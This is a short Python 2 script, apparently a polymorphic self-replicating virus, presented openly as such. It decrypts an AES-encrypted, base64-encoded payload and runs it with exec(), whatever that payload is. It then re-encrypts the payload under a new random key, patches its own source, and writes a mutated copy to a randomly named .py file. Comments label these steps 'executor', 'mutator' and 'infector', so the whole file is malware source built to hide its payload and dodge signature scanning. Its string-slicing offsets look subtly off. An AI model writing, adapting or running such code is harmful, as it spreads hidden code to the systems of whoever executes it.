#polymorph
C='E/Z4bvimVvRMnpJJRE54nh61bf6Ppq1wlnmcqKHa3qb9+xO61iTfgvLBe8MqTtDd825cTwR+bmX9yqZlQmRWfxs8ss9sLYviwfuT+tRlWIGRwsKF0PfyKQz4q/o21YZvSRXOHShko2C0iKy59f3g1xKTAjkry7g0Rpyg2NC59UA='
K='tOtchrS3nIZyn5R/6HcGKVNp5JZpKnQwobFxn0jgoxI='
#imports
import sys
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad,unpad
#helpers
def E(PTX,KEY):
	return b64encode(AES.new(b64decode(KEY),AES.MODE_ECB).encrypt(pad(PTX,AES.block_size)));
def D(CTX,KEY):
	return unpad(AES.new(b64decode(KEY),AES.MODE_ECB).decrypt(b64decode(CTX)),AES.block_size);
def dynload(code):
	exec(code)
#identifier
print "i came with "+C+K
#unwrapper
PAYLOAD=D(C,K)
#executor
dynload(PAYLOAD)
#mutator
K_dash=b64encode(get_random_bytes(32))
C_dash=E(PAYLOAD,K_dash)
#infector
BODY=open(sys.argv[0],"r").read()
BODY=BODY.replace(BODY[BODY.find("C='")+3:BODY.find("\'\nK='")-1],C_dash)
BODY=BODY.replace(BODY[BODY.find("K='")+3:BODY.find("\'\n#imports")-1],K_dash)
open(b64encode(get_random_bytes(5))+".py","w").write(BODY)
#end
